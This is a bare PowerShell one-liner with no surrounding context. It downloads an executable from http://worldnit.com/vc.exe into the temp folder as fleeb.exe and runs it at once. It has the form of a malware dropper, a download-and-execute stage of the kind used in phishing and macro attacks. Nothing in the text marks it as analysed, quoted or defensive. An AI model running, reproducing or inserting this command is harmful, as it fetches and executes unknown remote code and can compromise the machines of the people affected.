
($deploylocation=$env:temp+'fleeb.exe');(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/vc.exe', $deploylocation);Start-Process $deploylocation

